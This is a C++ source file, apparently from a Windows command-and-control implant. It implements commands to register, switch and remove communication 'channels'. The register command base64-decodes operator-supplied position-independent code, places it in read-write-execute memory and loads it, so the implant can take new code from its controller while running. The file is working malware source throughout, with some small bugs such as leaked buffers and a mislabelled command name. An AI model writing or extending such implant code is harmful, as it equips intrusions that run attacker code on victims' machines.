#include "Command.h"

#include "Channel.h"
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

// Decodes a Base64 string into a heap-allocated buffer
BYTE* Base64Decode(const char* input, DWORD* outLen) {
	DWORD dwDecodedLen = 0;

	// 1. Calculate required buffer size
	if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, NULL, &dwDecodedLen, NULL, NULL)) {
		return NULL;
	}

	// 2. Allocate memory using the Windows Heap (matching your Rtl pattern)
	BYTE* decodedData = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecodedLen);
	if (!decodedData) return NULL;

	// 3. Perform actual decoding
	if (!CryptStringToBinaryA(input, 0, CRYPT_STRING_BASE64, decodedData, &dwDecodedLen, NULL, NULL)) {
		HeapFree(GetProcessHeap(), 0, decodedData);
		return NULL;
	}

	*outLen = dwDecodedLen;
	return decodedData;
}


// CommandChannelRegister register a user defined channel
//
BOOL CommandChannelRegister(json& args, string artifact, json& result) {
	DWORD size = 0;
	BYTE* pic = NULL;
	BYTE* memory = NULL;

	if (artifact.empty()) {
		return FALSE;
	}

	// decode channel pic
	pic = Base64Decode(artifact.c_str(), &size);
	if (pic == NULL) {
		return FALSE;
	}

	// allocate memory to run channel pic 
	memory = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (memory == NULL) {
		return FALSE;
	}

	// load channel pic
	if (!ChannelLoad(memory, pic, size)) {
		return FALSE;
	}

	if (!ChannelRegister(memory, size)) {
		return FALSE;
	}

	result["name"] = "channel.register";
	result["output"] = "[+] Channel added successfully";

	return TRUE;
}

// CommandChannelSwitch switch channel
//
BOOL CommandChannelSwitch(json& args, string artifact, json& result) {
	DWORD ChannelID = 0;

	ChannelID = args[0].get<DWORD>();
	if (!ChannelSwitch(ChannelID)) {
		printf("Failed to swtich channel\n");
		result["output"] = "[-] Failed to swtich channel";
		return FALSE;
	}

	printf("Channel switched successfully\n");
	result["name"] = "channel.switch";
	result["output"] = "[+] Channel switched successfully";

	return TRUE;
}

// CommandChannelRemove remove registered channel
//
BOOL CommandChannelRemove(json& args, string artifact, json& result) {
	DWORD ChannelID = 0;

	ChannelID = args[0].get<DWORD>();
	
	if (g_Channel->Interface->ID == ChannelID) {
		result["output"] = "[!] channel is used";
		return FALSE;
	}

	if (!ChannelRemove(ChannelID)) {
		result["output"] = "[-] Failed to remove channel";
		return FALSE;
	}

	result["name"] = "channel.switch";
	result["output"] = "[+] Channel removed successfully";

	return TRUE;
}